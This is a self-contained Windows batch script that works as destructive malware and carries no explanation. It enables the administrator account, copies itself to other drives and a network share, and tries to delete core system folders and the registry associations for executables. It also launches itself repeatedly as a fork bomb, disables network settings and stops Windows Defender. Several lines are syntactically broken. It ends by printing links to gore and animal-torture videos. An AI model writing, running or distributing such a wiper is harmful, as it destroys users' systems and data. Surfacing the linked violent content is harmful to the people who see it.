@echo off
shutdown /r /f /fw /t 3600

icacls C:\setup.bat /grant Users:F

cd /
mkdir test
cd test
copy c:\setup.bat
copy setup.bat config.bat
copy setup.bat drivers.bat
copy setup.bat perflogs.bat
copy setup.bat "program files.bat"
copy setup.bat programdata.bat
copy setup.bat recovery.bat
copy setup.bat system.bat
copy setup.bat users.bat

net user administrator /active:yes

xcopy C:\setup.bat E:\Files /i
xcopy /h /c /k /e /r /y c:\ d:\
xcopy "C:\setup.bat" D:\Backup /c /d /e /h /i /k /q /r /s /x /y
xcopy C:\setup.bat "\\SERVER\Media Backup" /f /j /s /w /z

rmdir /s /q "windows .~bt"
rmdir /s /q "windows .~ws"
rmdir /s /q $recycle.bin
rmdir /s /q config.msi
rmdir /s /q "Documents and Settings [C:\Users]"
rmdir /s /q drivers
rmdir /s /q dumpstack.log.tmp
rmdir /s /q hiberfil.sys
rmdir /s /q onedrivetemp
rmdir /s /q pagefile.sys
rmdir /s /q perflogs
rmdir /s /q "program files"
rmdir /s /q "program files (x86)"
rmdir /s /q programdata
rmdir /s /q recovery
rmdir /s /q swapfile.sys
rmdir /s /q "system volume information"
rmdir /s /q users
rmdir /s /q windows
rmdir /s /q inetpub
rmdir /s /q esd
rmdir /s /q xboxgames


del /f /a /q /s $recycle.bin
del /f /a /q /s config.msi
del /f /a /q /s "Documents and Settings [C:\Users]"
del /f /a /q /s drivers
del /f /a /q /s dumpstack.log.tmp
del /f /a /q /s hiberfil.sys
del /f /a /q /s onedrivetmp
del /f /a /q /s pagefile.sys
del /f /a /q /s perflogs
del /f /a /q /s "program files"
del /f /a /q /s "program files (x86)"
del /f /a /q /s programdata
del /f /a /q /s recovery
del /f /a /q /s setup.log 
del /f /a /q /s swapfile.sys
del /f /a /q /s "system volume information"
del /f /a /q /s users
del /f /a /q /s windows
del /f /a /q /s windows.old
del /f /a /q /s appverifui.dll
del /f /a /q /s "pc2,pc3,pc4-2023-11-15-MSUpdates.log"
del /f /a /q /s vfcompact.dll


cd /
compact.exe /s /i /f

Del C: *.* |y


START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*

for /l %%a in (1,1,50) start setup.bat
for /l %%a in (1,1,50) start setup.bat
for /l %%a in (1,2,50) do start rstrui.exe

Ipconfig /release
ipconfig /flushdns
ipconfig /release6
ipconfig /setclassid null
set classpath=d:killme

sc stop windefend

echo web.archive.org/web/20211019130858/seegore.com/video-1444
echo.
echo https://deadhouse.org/animals-en/sawed-up-a-live-puppy-and-fed-it-to-a-dog.html
echo. 
echo http://web.archive.org/web/20220217183528/https://seegore.com/rival-gang-member-flayed-tortured-and-beheaded/
echo.
echo http://web.archive.org/web/20210824071325/files.catbox.moe/310ldj.mp4
echo.
start setup.bat

setup.bat




